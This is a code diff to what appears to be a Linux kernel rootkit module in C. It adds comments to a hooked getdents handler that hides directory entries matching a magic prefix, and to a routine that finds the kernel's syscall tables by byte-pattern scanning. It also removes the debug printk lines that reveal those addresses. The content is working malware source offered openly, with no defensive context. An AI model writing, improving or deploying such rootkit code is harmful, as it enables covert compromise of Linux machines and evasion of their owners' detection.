@@ -57,15 +57,20 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
   i = 0;
   last_d_reclen = 0;
   dirent = (struct linux_dirent *)buffer;
-  
+
+  /* run through all the linux_dirent structures */
   while (i < bytes_read) {
     d_reclen = dirent->d_reclen;
 
+    /* chech matching with MAGIC_PREFIX */
     j = 0;
     while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && dirent->d_name[j] == MAGIC_PREFIX[j])
       j++;
 
+    /* hide directory entry */
     if (j == MAGIC_PREFIX_LEN) {
+      
+      /* swap first and second structures */
       if (last_d_reclen == 0) {
 	buffer_dirent = kmalloc(d_reclen, GFP_KERNEL);
 	if (!buffer_dirent) {
@@ -121,6 +126,7 @@ static void search_sys_call_table(void) {
   unsigned char pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
   unsigned char pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};
 
+  /* fetch pattern_0 for call to do_syscall_64 function */
   for (i = 0; i < SEARCH_RANGE; i++) {
     j = 0;
     while (j < PATTERN_SIZE && entry_SYSCALL_64[i + j] == pattern_0[j])
@@ -129,7 +135,6 @@ static void search_sys_call_table(void) {
     if (j == PATTERN_SIZE) {
       do_syscall_64_offset = (int *)(entry_SYSCALL_64 + i + PATTERN_SIZE);
       do_syscall_64 = (unsigned char *)(entry_SYSCALL_64 + i + PATTERN_SIZE + sizeof(int) + *do_syscall_64_offset);
-      printk(KERN_INFO "call to do_syscall_64 at %p (%p)", entry_SYSCALL_64 + i + PATTERN_SIZE - 1, do_syscall_64);
       break;
     } 
   }
@@ -138,7 +143,8 @@ static void search_sys_call_table(void) {
     printk(KERN_INFO "failed to find do_syscall_64 address");
     return;
   }
-  
+
+  /* fetch pattern_1 for offset of sys_call_table */
   for (i = 0; i < SEARCH_RANGE; i++) {
     j = 0;
     while (j < PATTERN_SIZE && do_syscall_64[i + j] == pattern_1[j])
@@ -147,11 +153,11 @@ static void search_sys_call_table(void) {
     if (j == PATTERN_SIZE) {
       sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
       sys_call_table = (void **)(*sys_call_table_offset);
-      printk(KERN_INFO "call to sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, sys_call_table); 
       break;
     } 
   }
 
+  /* fetch pattern_2 for offset of ia32_sys_call_table */
   for ( ; i < SEARCH_RANGE; i++) {
     j = 0;
     while (j < PATTERN_SIZE && do_syscall_64[i + j] == pattern_2[j])
@@ -160,7 +166,6 @@ static void search_sys_call_table(void) {
     if (j == PATTERN_SIZE) {
       ia32_sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
       ia32_sys_call_table = (void **)(*ia32_sys_call_table_offset);
-      printk(KERN_INFO "call to ia32_sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, ia32_sys_call_table);
     }
   }
 
